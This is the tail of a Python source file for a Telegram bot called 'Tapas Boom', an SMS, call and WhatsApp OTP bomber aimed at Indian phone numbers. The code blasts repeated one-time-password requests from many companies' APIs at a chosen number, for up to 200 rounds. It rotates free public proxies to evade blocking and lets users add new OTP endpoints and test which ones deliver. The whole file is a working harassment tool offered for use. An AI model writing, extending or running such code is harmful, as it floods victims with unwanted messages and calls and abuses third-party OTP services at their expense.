            await conn.close()


# ════════════════════════════════════════════════════════════
# PROXY ENGINE — Self-discovering free proxy pool
# Fetches proxies from public sources, tests them, rotates on failure.
# No external proxy service needed — builds its own working pool.
# ════════════════════════════════════════════════════════════

import json as _json

_PROXY_POOL:   list[str] = []          # validated proxies  "http://ip:port"
_PROXY_LOCK    = threading.Lock()
_BAD_PROXIES:  set[str] = set()        # blacklist for this session
_PROXY_REFRESHED_AT: float = 0.0
_PROXY_TTL = 600   # refresh pool every 10 minutes

# Public free-proxy list sources (no API key, no auth)
_PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
]

def _fetch_raw_proxies() -> list[str]:
    """Download proxy lists from all sources, return deduplicated ip:port list."""
    seen: set[str] = set()
    result: list[str] = []
    for src in _PROXY_SOURCES:
        try:
            resp = urllib.request.urlopen(src, timeout=8)
            text = resp.read().decode("utf-8", errors="ignore")
            for line in text.splitlines():
                line = line.strip()
                # Accept lines like "1.2.3.4:8080" or "http://1.2.3.4:8080"
                if line.startswith("http://") or line.startswith("https://"):
                    line = line.split("//", 1)[1].split("/")[0]
                if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}:\d{2,5}$", line) and line not in seen:
                    seen.add(line)
                    result.append(line)
        except Exception:
            pass
    random.shuffle(result)
    return result[:800]   # cap at 800 candidates to keep test fast

def _test_proxy_sync(proxy_str: str, test_url: str = "http://www.google.com", timeout: int = 6) -> bool:
    """Test a single proxy synchronously. Returns True if usable."""
    try:
        proxy_handler = urllib.request.ProxyHandler({"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"})
        opener = urllib.request.build_opener(proxy_handler, urllib.request.HTTPHandler())
        opener.addheaders = [("User-Agent", random.choice(_UAS))]
        resp = opener.open(test_url, timeout=timeout)
        return resp.status < 400
    except Exception:
        return False

def _build_proxy_pool():
    """Background thread: fetch + test proxies, populate _PROXY_POOL."""
    global _PROXY_REFRESHED_AT
    logger.info("🔍 [PROXY] Discovering free proxies...")
    candidates = _fetch_raw_proxies()
    if not candidates:
        logger.warning("⚠️ [PROXY] No candidates fetched — will retry later.")
        return

    good: list[str] = []
    from concurrent.futures import ThreadPoolExecutor, as_completed
    with ThreadPoolExecutor(max_workers=80) as pool:
        fut_map = {pool.submit(_test_proxy_sync, p): p for p in candidates[:400]}
        for fut in as_completed(fut_map, timeout=60):
            p = fut_map[fut]
            try:
                if fut.result():
                    good.append(f"http://{p}")
                    if len(good) >= 60:    # stop once we have 60 working
                        break
            except Exception:
                pass

    with _PROXY_LOCK:
        _PROXY_POOL.clear()
        _PROXY_POOL.extend(good)
        _BAD_PROXIES.clear()
        _PROXY_REFRESHED_AT = time.time()
    logger.info("✅ [PROXY] Pool ready: %d working proxies", len(good))

def _ensure_proxy_pool():
    """Trigger a background refresh if pool is stale or empty."""
    now = time.time()
    if now - _PROXY_REFRESHED_AT > _PROXY_TTL or len(_PROXY_POOL) < 5:
        threading.Thread(target=_build_proxy_pool, daemon=True).start()

def get_proxy() -> str | None:
    """Return a random proxy from the pool (or None to go direct)."""
    _ensure_proxy_pool()
    with _PROXY_LOCK:
        available = [p for p in _PROXY_POOL if p not in _BAD_PROXIES]
    return random.choice(available) if available else None

def mark_proxy_bad(proxy: str):
    """Blacklist a proxy that failed."""
    with _PROXY_LOCK:
        _BAD_PROXIES.add(proxy)
        if proxy in _PROXY_POOL:
            _PROXY_POOL.remove(proxy)

async def _call_with_proxy(sess: aiohttp.ClientSession, api: dict, target: str,
                           proxy: str | None = None) -> str:
    """Wrapper around _call that injects a proxy header if provided."""
    name = api["name"]
    if proxy:
        try:
            url = api["url"].replace("{target}", target)
            hdrs = {**_base_headers(api.get("origin", "")), **api.get("extra_headers", {})}
            raw_body = api.get("json")
            json_ = None
            if raw_body:
                fn, ln = _rand_name()
                json_ = {k: (v.replace("{target}", target)
                              .replace("{email}", _rand_email())
                              .replace("{name}", fn + " " + ln)
                              .replace("{firstname}", fn)
                              .replace("{lastname}", ln)
                              .replace("{device}", _rand_device())
                              .replace("{uuid}", str(uuid.uuid4()))
                             if isinstance(v, str) else v)
                         for k, v in raw_body.items()}
            method = api.get("method", "POST").upper()
            identifier = api.get("identifier", "")
            async with aiohttp.ClientSession() as proxy_sess:
                kw = dict(headers=hdrs, timeout=TIMEOUT, ssl=False,
                          allow_redirects=True, proxy=proxy)
                async with proxy_sess.request(method, url, json=json_, **kw) as r:
                    body = await r.text(errors="ignore")
                    if _ok(r.status, body, identifier):
                        return f"✅ {name} (proxy)"
                    else:
                        mark_proxy_bad(proxy)
        except Exception:
            mark_proxy_bad(proxy)
    # Fallback to direct
    return await _call(sess, api, target)


# ════════════════════════════════════════════════════════════
# SELF-PING (keep Render/Railway free tier awake)
# ════════════════════════════════════════════════════════════

def _self_ping():
    while True:
        time.sleep(25 * 60)
        if not PING_URL:
            continue
        try:
            urllib.request.urlopen(PING_URL, timeout=10)
            logger.info("💓 self-ping OK")
        except Exception:
            pass

# ════════════════════════════════════════════════════════════
# BOT COMMANDS
# ════════════════════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    total = len(SMS_APIS) + len(CALL_APIS) + len(WA_APIS)
    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📖 Help", callback_data="help"),
            InlineKeyboardButton("📊 Status", callback_data="status"),
        ],
        [
            InlineKeyboardButton("➕ Add API", callback_data="addapi"),
        ],
    ])
    await update.message.reply_text(
        f"🔥 *Tapas Boom v4.3 — Direct*\n\n"

        f"📩 SMS APIs : `{len(SMS_APIS)}`\n"
        f"📞 Call APIs: `{len(CALL_APIS)}`\n"
        f"💬 WA APIs  : `{len(WA_APIS)}`\n"
        f"⚡ Total    : `{total}`\n\n"
        f"USA server se direct Indian numbers pe OTP!\n"
        f"Koi proxy nahi, koi key nahi — seedha fire!\n\n"
        f"Number bhejo ya `/blast 9876543210 10` karo",
        parse_mode="Markdown",
        reply_markup=kb,
    )


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    txt = (
        "📖 *Tapas Boom v4.2 — Commands*\n\n"
        "*🔥 Blast:*\n"
        "`/blast 9876543210` — 10 rounds (default)\n"
        "`/blast 9876543210 50` — 50 rounds\n"
        "`/sms 9876543210` — sirf SMS\n"
        "`/call 9876543210` — sirf Call OTP\n"
        "`/wa 9876543210` — sirf WhatsApp OTP\n\n"
        "*🔍 Debug (OTP nahi aa raha? Yeh use karo!):*\n"
        "`/debug 9876543210` — har API ka actual HTTP response dikho\n"
        "`/test 9876543210 Swiggy` — ek specific API test karo\n\n"
        "*📊 Info:*\n"
        "`/status` — API count + health\n"
        "`/stats` — failure stats\n"
        "`/recover` — health cache reset\n\n"
        "Ya bas number type karo — auto fire hoga!\n\n"
        "_Tip: /debug se pata karo kaun si APIs actually deliver karti hain_ 👆"
    )
    await update.message.reply_text(txt, parse_mode="Markdown")


async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    total = len(SMS_APIS) + len(CALL_APIS) + len(WA_APIS)
    with _api_health_lock:
        skipped = sum(
            1 for h in _api_health.values()
            if h["fails"] >= _API_SKIP_THRESHOLD
               and time.monotonic() - h["last_fail"] < _API_RECOVER_AFTER
        )
        total_ok = sum(h.get("ok", 0) for h in _api_health.values())
    await update.message.reply_text(
        f"📊 *Bot Status*\n\n"
        f"📩 SMS: `{len(SMS_APIS)}` APIs\n"
        f"📞 Call: `{len(CALL_APIS)}` APIs\n"
        f"💬 WA: `{len(WA_APIS)}` APIs\n"
        f"⚡ Total: `{total}` APIs\n"
        f"🔴 Cooldown: `{skipped}` APIs\n"
        f"✅ All-time OK: `{total_ok}`\n\n"
        f"_Proxy-free mode — direct USA→India_",
        parse_mode="Markdown",
    )


async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    with _api_health_lock:
        data = sorted(_api_health.items(), key=lambda x: x[1]["fails"], reverse=True)
    if not data:
        await update.message.reply_text("No stats yet — blast karo pehle!")
        return
    lines = ["📈 *API Stats (top failures)*\n"]
    for name, h in data[:15]:
        lines.append(f"`{name}` — ✅{h['ok']} ❌{h['fails']}")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")


async def cmd_recover(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    with _api_health_lock:
        _api_health.clear()
    await update.message.reply_text(
        "♻️ *Health cache reset!*\nSab APIs fresh start karenge.",
        parse_mode="Markdown",
    )


async def cmd_debug(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """/debug 9876543210 — har API ka actual response body dikho"""
    args = ctx.args or []
    if not args:
        await update.message.reply_text(
            "❗ Usage: `/debug 9876543210`\n\nYeh command har SMS API ko ek baar fire karti hai aur actual response dikhati hai.\n"
            "Isse pata chalega kaun si API actually deliver kar rahi hai.",
            parse_mode="Markdown",
        )
        return
    mobile = _parse_mobile(args[0])
    if not mobile:
        await update.message.reply_text("❗ 10-digit number do (e.g. 9876543210)")
        return

    # Only test SMS APIs in debug mode (not call/wa to keep output short)
    apis_to_test = SMS_APIS[:15]  # first 15 only to avoid message flood
    await update.message.reply_text(
        f"🔍 *Debug Mode* — `+91{mobile}`\n"
        f"Testing top {len(apis_to_test)} SMS APIs one by one...\n"
        f"_(Actual HTTP status + response snippet dikhega)_",
        parse_mode="Markdown",
    )

    results_text = []
    for api in apis_to_test:
        res = await _call_debug(api, mobile)
        status = res["status"]
        ok_mark = "✅" if res["ok"] else "❌"
        body_preview = res["body"].replace("`", "'")[:200]
        results_text.append(
            f"{ok_mark} *{res['name']}* | HTTP `{status}`\n"
            f"```\n{body_preview}\n```"
        )

    # Send in chunks of 5 (Telegram message size limit)
    for i in range(0, len(results_text), 5):
        chunk = "\n\n".join(results_text[i:i+5])
        try:
            await update.message.reply_text(chunk, parse_mode="Markdown")
        except Exception:
            # If markdown fails, send plain
            plain = chunk.replace("*", "").replace("`", "").replace("```", "")
            await update.message.reply_text(plain[:4000])


async def cmd_test(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """/test 9876543210 Swiggy — ek specific API test karo"""
    args = ctx.args or []
    if len(args) < 2:
        all_names = [a["name"] for a in SMS_APIS + CALL_APIS + WA_APIS]
        sample = ", ".join(all_names[:8])
        await update.message.reply_text(
            f"❗ Usage: `/test 9876543210 Swiggy`\n\nAvailable APIs (sample): `{sample}`, ...",
            parse_mode="Markdown",
        )
        return
    mobile = _parse_mobile(args[0])
    if not mobile:
        await update.message.reply_text("❗ 10-digit number do")
        return
    api_name = " ".join(args[1:]).strip()
    all_apis = SMS_APIS + CALL_APIS + WA_APIS
    found = next((a for a in all_apis if a["name"].lower() == api_name.lower()), None)
    if not found:
        close = [a["name"] for a in all_apis if api_name.lower() in a["name"].lower()][:5]
        hint = f"\nClose matches: `{', '.join(close)}`" if close else ""
        await update.message.reply_text(
            f"❗ API `{api_name}` nahi mili.{hint}\n\n`/debug` use karo sab dekhne ke liye.",
            parse_mode="Markdown",
        )
        return

    await update.message.reply_text(
        f"🔍 Testing *{found['name']}* on `+91{mobile}`...",
        parse_mode="Markdown",
    )
    res = await _call_debug(found, mobile)
    ok_mark = "✅ Delivered (API ne accept kiya)" if res["ok"] else "❌ Failed / Not delivered"
    body_preview = res["body"].replace("`", "'")[:500]
    await update.message.reply_text(
        f"*{found['name']}* result:\n"
        f"Status: `{res['status']}`\n"
        f"Result: {ok_mark}\n\n"
        f"*Raw response:*\n```\n{body_preview}\n```",
        parse_mode="Markdown",
    )


# ════════════════════════════════════════════════════════════
# BLAST COMMANDS
# ════════════════════════════════════════════════════════════

def _parse_mobile(text: str) -> str:
    digits = "".join(c for c in text if c.isdigit())
    if digits.startswith("91") and len(digits) == 12:
        digits = digits[2:]
    return digits if len(digits) == 10 else ""


def _done_kb(mobile: str, mode: str, rounds: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🔁 Again", callback_data=f"again_{mobile}_{mode}_{rounds}"),
        InlineKeyboardButton("🔴 Double", callback_data=f"again_{mobile}_{mode}_{min(rounds*2,200)}"),
    ]])


async def _do_fire(update_or_query, mobile: str, mode: str, rounds: int, is_query: bool = False):
    """Start blast as background task with STOP button."""
    if is_query:
        user_id = update_or_query.from_user.id
    else:
        user_id = update_or_query.message.from_user.id

    mode_labels = {"sms": "📩 SMS", "call": "📞 Call", "wa": "💬 WA", "all": "🚀 All"}
    label      = mode_labels.get(mode, mode.upper())
    total_apis = {
        "sms": len(SMS_APIS), "call": len(CALL_APIS),
        "wa": len(WA_APIS), "all": len(SMS_APIS) + len(CALL_APIS) + len(WA_APIS)
    }.get(mode, 0)

    stop_kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{user_id}")
    ]])

    fire_text = (
        f"🔥 *Firing!* `+91{mobile}`\n"
        f"Mode: {label} | Rounds: *{rounds}*\n"
        f"~{total_apis * rounds} total requests\n"
        f"⏳ Chal raha hai... _(rok ne ke liye 🛑 dabao)_"
    )
    if is_query:
        msg = await update_or_query.edit_message_text(
            fire_text, parse_mode="Markdown", reply_markup=stop_kb
        )
    else:
        msg = await update_or_query.message.reply_text(
            fire_text, parse_mode="Markdown", reply_markup=stop_kb
        )

    async def _fire_task():
        try:
            ok, total, _ = await run_blast(mobile, rounds, mode)
            rate = int(ok / total * 100) if total else 0
            done_text = (
                f"✅ *Done!* `+91{mobile}`\n"
                f"{label} | *{rounds}* rounds\n"
                f"📊 *{ok}/{total}* APIs responded ({rate}%)"
            )
            await msg.edit_text(
                done_text, parse_mode="Markdown",
                reply_markup=_done_kb(mobile, mode, rounds)
            )
        except asyncio.CancelledError:
            try:
                await msg.edit_text(
                    f"🛑 *Ruk gaya!* `+91{mobile}`\n{label} — aapne rok diya ✋",
                    parse_mode="Markdown",
                    reply_markup=_done_kb(mobile, mode, rounds),
                )
            except Exception:
                pass
        except Exception as e:
            logger.error("_fire_task error uid=%s: %s", user_id, e)
        finally:
            _user_tasks.pop(user_id, None)

    old = _user_tasks.get(user_id)
    if old and not old.done():
        old.cancel()

    loop = asyncio.get_event_loop()
    task = loop.create_task(_fire_task())
    _user_tasks[user_id] = task


async def cmd_blast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """/blast 9876543210 [rounds]"""
    args = ctx.args or []
    if not args:
        await update.message.reply_text(
            "❗ Usage: `/blast 9876543210 20`\n_(rounds default=10, max=200)_",
            parse_mode="Markdown",
        )
        return
    mobile = _parse_mobile(args[0])
    if not mobile:
        await update.message.reply_text("❗ 10-digit number do (e.g. 9876543210)")
        return
    rounds = min(int(args[1]) if len(args) > 1 and args[1].isdigit() else 10, 200)
    await _do_fire(update, mobile, "all", rounds, is_query=False)


async def cmd_sms(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """/sms 9876543210 [rounds]"""
    args = ctx.args or []
    if not args:
        await update.message.reply_text("❗ Usage: `/sms 9876543210 10`", parse_mode="Markdown")
        return
    mobile = _parse_mobile(args[0])
    if not mobile:
        await update.message.reply_text("❗ 10-digit number do")
        return
    rounds = min(int(args[1]) if len(args) > 1 and args[1].isdigit() else 5, 200)
    await _do_fire(update, mobile, "sms", rounds, is_query=False)


async def cmd_call(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """/call 9876543210 [rounds]"""
    args = ctx.args or []
    if not args:
        await update.message.reply_text("❗ Usage: `/call 9876543210 10`", parse_mode="Markdown")
        return
    mobile = _parse_mobile(args[0])
    if not mobile:
        await update.message.reply_text("❗ 10-digit number do")
        return
    rounds = min(int(args[1]) if len(args) > 1 and args[1].isdigit() else 5, 200)
    await _do_fire(update, mobile, "call", rounds, is_query=False)


async def cmd_wa(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """/wa 9876543210 [rounds]"""
    args = ctx.args or []
    if not args:
        await update.message.reply_text("❗ Usage: `/wa 9876543210 10`", parse_mode="Markdown")
        return
    mobile = _parse_mobile(args[0])
    if not mobile:
        await update.message.reply_text("❗ 10-digit number do")
        return
    rounds = min(int(args[1]) if len(args) > 1 and args[1].isdigit() else 5, 200)
    await _do_fire(update, mobile, "wa", rounds, is_query=False)


# ════════════════════════════════════════════════════════════
# MESSAGE HANDLER — bare number send karo, auto blast
# ════════════════════════════════════════════════════════════

async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    # ➕ /addapi followup — accepts JSON object / array / JSONL / URL list
    if _ADD_WAIT.pop(update.effective_user.id, False):
        try:
            specs = _parse_api_payload(update.message.text or "")
            added, failed = _register_bulk(specs)
            await update.message.reply_text(
                f"✅ Added `{len(added)}` API(s) (failed: `{failed}`). "
                f"Total SMS APIs: `{len(SMS_APIS)}`\n"
                f"_Tip: bade list ke liye `.txt` / `.json` file bhi DM me bhej sakte ho._",
                parse_mode="Markdown",
            )
        except Exception as e:
            await update.message.reply_text(f"❌ Parse failed: `{e}`", parse_mode="Markdown")
        return
    text = (update.message.text or "").strip()
    mobile = _parse_mobile(text)
    if not mobile:
        await update.message.reply_text(
            "❓ 10-digit number bhejo ya command use karo.\n`/help` dekho.",
            parse_mode="Markdown",
        )
        return

    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🚀 All (SMS+Call+WA)", callback_data=f"fire_{mobile}_all_10"),
        ],
        [
            InlineKeyboardButton("📩 SMS Only", callback_data=f"fire_{mobile}_sms_5"),
            InlineKeyboardButton("📞 Call Only", callback_data=f"fire_{mobile}_call_5"),
        ],
        [
            InlineKeyboardButton("💬 WA Only",  callback_data=f"fire_{mobile}_wa_5"),
            InlineKeyboardButton("🔥 50 Rounds", callback_data=f"fire_{mobile}_all_50"),
        ],
    ])
    await update.message.reply_text(
        f"📱 `+91{mobile}` — kaise fire karein?",
        parse_mode="Markdown",
        reply_markup=kb,
    )


# ════════════════════════════════════════════════════════════
# BUTTON HANDLER
# ════════════════════════════════════════════════════════════

async def handle_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q    = update.callback_query
    data = q.data or ""
    await q.answer()

    # STOP button
    if data.startswith("stop_"):
        uid = int(data.split("_", 1)[1])
        task = _user_tasks.get(uid)
        if task and not task.done():
            task.cancel()
            await q.edit_message_text("🛑 Ruk raha hoon...")
        else:
            await q.answer("Already stopped!", show_alert=True)
        return

    # Fire button: fire_{mobile}_{mode}_{rounds}
    if data.startswith("fire_"):
        parts = data.split("_", 4)
        if len(parts) >= 4:
            _, mobile, mode, rounds_s = parts[0], parts[1], parts[2], parts[3]
            rounds = min(int(rounds_s) if rounds_s.isdigit() else 10, 200)
            await _do_fire(q, mobile, mode, rounds, is_query=True)
        return

    # Again / Double button: again_{mobile}_{mode}_{rounds}
    if data.startswith("again_"):
        parts = data.split("_", 4)
        if len(parts) >= 4:
            _, mobile, mode, rounds_s = parts[0], parts[1], parts[2], parts[3]
            rounds = min(int(rounds_s) if rounds_s.isdigit() else 10, 200)
            await _do_fire(q, mobile, mode, rounds, is_query=True)
        return

    # Inline help / status
    if data == "addapi":
        _ADD_WAIT[q.from_user.id] = True
        await q.edit_message_text(
            "➕ *Add API (custom)*\n\n"
            "Ek JSON bhejo, ye format me:\n\n"
            "`{\"name\":\"MyApi\",\"url\":\"https://x.com/otp\",\"json\":{\"mobile\":\"+91{target}\"}}`\n\n"
            "Ya `/addapi <json>` command use karo.\n"
            "Add hone ke baad SMS blast me automatic use hogi.",
            parse_mode="Markdown",
        )
        return
    if data == "help":
        await q.edit_message_text(
            "📖 *Commands*\n\n"
            "`/blast 9876543210 10`\n`/sms /call /wa`\n`/status /stats /recover`\n\n"
            "Ya bas number type karo!",
            parse_mode="Markdown",
        )
    elif data == "status":
        total = len(SMS_APIS) + len(CALL_APIS) + len(WA_APIS)
        await q.edit_message_text(
            f"📊 *Status*\n\n"
            f"Total APIs: `{total}`\n"
            f"SMS: `{len(SMS_APIS)}` | Call: `{len(CALL_APIS)}` | WA: `{len(WA_APIS)}`\n\n"
            f"_Proxy-free — direct USA→India_",
            parse_mode="Markdown",
        )





# ════════════════════════════════════════════════════════════
# /addapi — user adds custom OTP endpoint at runtime
# ════════════════════════════════════════════════════════════

async def cmd_addapi(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    raw = " ".join(ctx.args) if ctx.args else ""
    if not raw:
        _ADD_WAIT[update.effective_user.id] = True
        await update.message.reply_text(
            "➕ *Add API(s)*\n\n"
            "Agli message me kuch bhi bhejo:\n"
            "• Ek JSON object\n"
            "• JSON array `[ {..}, {..} ]`\n"
            "• Ya seedha `.txt` / `.json` *file* DM me — har line pe JSON ya URL.\n\n"
            "Example line: `{\"name\":\"MyApi\",\"url\":\"https://x.com/otp\",\"json\":{\"mobile\":\"+91{target}\"}}`",
            parse_mode="Markdown",
        )
        return
    try:
        specs = _parse_api_payload(raw)
        added, failed = _register_bulk(specs)
        await update.message.reply_text(
            f"✅ Added `{len(added)}` API(s) (failed: `{failed}`). "
            f"Total SMS APIs: `{len(SMS_APIS)}`",
            parse_mode="Markdown",
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Parse failed: `{e}`", parse_mode="Markdown")


# ════════════════════════════════════════════════════════════
# DOCUMENT HANDLER — DM me .txt / .json file bhejo, saari APIs add
# ════════════════════════════════════════════════════════════

async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg or not msg.document:
        return
    doc = msg.document
    fname = (doc.file_name or "file").lower()
    if not (fname.endswith(".txt") or fname.endswith(".json")
            or fname.endswith(".jsonl") or fname.endswith(".list")
            or (doc.mime_type or "").startswith("text/")):
        await msg.reply_text(
            "❗ Sirf `.txt` / `.json` / `.jsonl` file support hai.",
            parse_mode="Markdown",
        )
        return
    if doc.file_size and doc.file_size > 2 * 1024 * 1024:
        await msg.reply_text("❗ File 2MB se choti honi chahiye.")
        return
    try:
        tg_file = await doc.get_file()
        buf = await tg_file.download_as_bytearray()
        raw = bytes(buf).decode("utf-8", errors="replace")
        specs = _parse_api_payload(raw)
        added, failed = _register_bulk(specs)
        _ADD_WAIT.pop(update.effective_user.id, None)
        preview = ", ".join(added[:5]) + (" …" if len(added) > 5 else "")
        await msg.reply_text(
            f"✅ File se `{len(added)}` API(s) add hui (failed: `{failed}`).\n"
            f"Total SMS APIs: `{len(SMS_APIS)}`\n"
            f"{('Added: `' + preview + '`') if added else ''}",
            parse_mode="Markdown",
        )
    except Exception as e:
        await msg.reply_text(f"❌ File parse failed: `{e}`", parse_mode="Markdown")

# ════════════════════════════════════════════════════════════
# HEALTH SERVER  (Heroku web dyno ko $PORT bind karna zaroori hai,
# warna R10 "Boot timeout" aakar app crash ho jaata hai)
# ════════════════════════════════════════════════════════════

def _start_health_server():
    from http.server import BaseHTTPRequestHandler, HTTPServer

    class _Health(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"Tapas Boom bot is running")

        def do_HEAD(self):
            self.send_response(200)
            self.end_headers()

        def log_message(self, *args):
            pass

    def _serve():
        try:
            HTTPServer(("0.0.0.0", PORT), _Health).serve_forever()
        except Exception as exc:
            logger.warning("Health server band: %s", exc)

    threading.Thread(target=_serve, daemon=True).start()
    logger.info("Health server listening on port %d", PORT)


# ════════════════════════════════════════════════════════════
# MAIN
# ════════════════════════════════════════════════════════════

def main():
    global _SEM
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    _SEM = asyncio.Semaphore(80)

    # Heroku web dyno: $PORT bind karo warna R10 crash
    _start_health_server()

    # Self-ping thread (keep alive on free hosting)
    threading.Thread(target=_self_ping, daemon=True).start()

    from telegram.request import HTTPXRequest
    req = HTTPXRequest(
        connect_timeout=60.0,
        read_timeout=60.0,
        write_timeout=60.0,
        pool_timeout=60.0,
    )
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).request(req).build()
    app.add_handler(CommandHandler("start",   cmd_start))
    app.add_handler(CommandHandler("help",    cmd_help))
    app.add_handler(CommandHandler("status",  cmd_status))
    app.add_handler(CommandHandler("stats",   cmd_stats))
    app.add_handler(CommandHandler("recover", cmd_recover))
    app.add_handler(CommandHandler("blast",   cmd_blast))
    app.add_handler(CommandHandler("sms",     cmd_sms))
    app.add_handler(CommandHandler("call",    cmd_call))
    app.add_handler(CommandHandler("wa",      cmd_wa))
    app.add_handler(CommandHandler("debug",   cmd_debug))   # NEW: actual response body
    app.add_handler(CommandHandler("test",    cmd_test))    # NEW: test one specific API
    app.add_handler(CommandHandler("addapi",  cmd_addapi))   # NEW: user-added APIs
    app.add_handler(CallbackQueryHandler(handle_button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))   # NEW: file se bulk add

    total = len(SMS_APIS) + len(CALL_APIS) + len(WA_APIS)
    logger.info(
        "✅ Tapas Boom v4.0 CLEAN | SMS:%d Call:%d WA:%d Total:%d | No-Proxy Direct Mode",
        len(SMS_APIS), len(CALL_APIS), len(WA_APIS), total,
    )

    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
